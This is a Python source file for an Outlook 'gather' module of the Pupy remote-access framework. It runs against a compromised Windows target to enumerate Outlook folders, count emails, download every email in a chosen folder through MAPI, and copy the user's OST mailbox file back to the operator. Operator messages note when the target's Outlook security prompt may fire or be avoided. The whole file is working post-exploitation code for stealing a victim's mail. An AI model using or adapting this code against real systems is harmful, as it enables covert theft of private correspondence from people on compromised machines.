# -*- coding: UTF8 -*-

import os
from pupylib.PupyModule import *
from rpyc.utils.classic import upload
from modules.lib.windows.outlook import outlook
__class_name__="Outlook"

ROOT=os.path.abspath(os.path.join(os.path.dirname(__file__),"..",".."))

@config(compat="windows", category="gather")
class Outlook(PupyModule):
	'''
	'''
	dependencies=["win32api","win32com","pythoncom","winerror"]
	def init_argparse(self):
		'''
		'''
		self.arg_parser = PupyArgumentParser(prog="outlook", description=self.__doc__)
		self.arg_parser.add_argument('-i', dest='information', action='store_true', help="Get Outlook configuration")
		self.arg_parser.add_argument('-l', dest='foldersAndSubFolders', action='store_true', help="Get Outlook folders and subfolders")
		self.arg_parser.add_argument('-n', dest='numberOfEmails', action='store_true', help="Get number of emails stored in the outlook folder choisen (see options below)")
		self.arg_parser.add_argument('-d', dest='downloadAllEmails', action='store_true', help="Download all emails stored in the outlook folder choisen with MAPI (see options below)")
		self.arg_parser.add_argument('-t', dest='doawnloadOST', action='store_true', help="Download Outlook OST file (Offline or cached Outlook items)")
		self.arg_parser.add_argument('-output-folder', dest='localOutputFolder', default='output/', help="Folder which will contain emails locally (default: %(default)s)")
		self.arg_parser.add_argument('-folder-default', choices=list(outlook.OL_DEFAULT_FOLDERS), default="olFolderInbox", dest='outlookFolder', help="Choose Outlook Folder using a default folder (default: %(default)s)")
		self.arg_parser.add_argument('-folder-id', dest='folderId', default=None, help="Choose Outlook Folder using a folder ID (default: %(default)s)")
		self.arg_parser.add_argument('-otype', choices=list(outlook.OL_SAVE_AS_TYPE), default="olMSG", dest='msgSaveType', help="Email saved as this type (default: %(default)s)")

	def run(self, args):
		'''
		'''
		try:
			self.client.conn.modules['win32com.client'].Dispatch("Outlook.Application").GetNamespace("MAPI")
			self.success("Outlook application seems to be installed on the target")
		except Exception,e:
			logging.info("Outlook Application is probably not installed on this target. Impossible to continue...\n{0}".format(repr(e)))
			self.error("Outlook application doesn't seem to be installed on the target. Nothing to do. Cancelling!")
			return
		if args.information == True:
			outl = outlook(self, ROOT, localFolder=args.localOutputFolder, folderIndex=outlook.OL_DEFAULT_FOLDERS[args.outlookFolder])
			info = outl.getInformation()
			for key, value in info.iteritems():
				self.success("{0}: {1}".format(key, value))
			outl.close()
		if args.folderId != None:
			self.warning('Notice the folder Id option will be used and the default folder option will be disabled')
		if args.foldersAndSubFolders == True:
			self.success("Outlook folders and subfolders:")
			outl = outlook(self, ROOT, localFolder=args.localOutputFolder, folderIndex=outlook.OL_DEFAULT_FOLDERS[args.outlookFolder])
			outl.printFoldersAndSubFolders()
			outl.close()
		if args.numberOfEmails == True:
			self.success("Trying to get number of emails in the {0} folder".format(args.outlookFolder))
			outl = outlook(self, ROOT, localFolder=args.localOutputFolder, folderIndex=outlook.OL_DEFAULT_FOLDERS[args.outlookFolder], folderId=args.folderId)
			self.success("Number of emails in the {0} folder: {1}".format(args.outlookFolder, outl.getNbOfEmails()))
			outl.close()
		if args.downloadAllEmails == True:
			self.success("Trying to download all emails stored in the {0} folder".format(args.outlookFolder))
			outl = outlook(self, ROOT, localFolder=args.localOutputFolder, folderIndex=outlook.OL_DEFAULT_FOLDERS[args.outlookFolder], folderId=args.folderId, msgSaveType=args.msgSaveType)
			nb = outl.getNbOfEmails()
			if nb == 0:
				self.error("This box is empty. You should choose another outlook folder")
			else:
				self.success("{0} emails found in {0}, Starting download...".format(args.outlookFolder))
				self.warning("If nothing happens, a Outlook security prompt has probably been triggered on the target.")
				self.warning("Notice if an antivirus is installed on the target, you should be abled to download emails without security prompt (see https://support.office.com/en-us/article/I-get-warnings-about-a-program-accessing-e-mail-address-information-or-sending-e-mail-on-my-behalf-df007135-c632-4ae4-8577-dd4ba26750a2)")
				outl.downloadAllEmails()
			outl.close()
		if args.doawnloadOST == True:
			outl = outlook(self, ROOT, localFolder=args.localOutputFolder, folderIndex=outlook.OL_DEFAULT_FOLDERS[args.outlookFolder], autoConnectToMAPI=False)
			self.success("Trying to download Outlook OST file of the targeted current user")
			path = outl.downloadOSTFile()
			if path == None:
				self.error("OST file not found or an error occured")
			else:
				self.success("OST file downloaded from {0} to {1}".format(path, outl.localFolder))
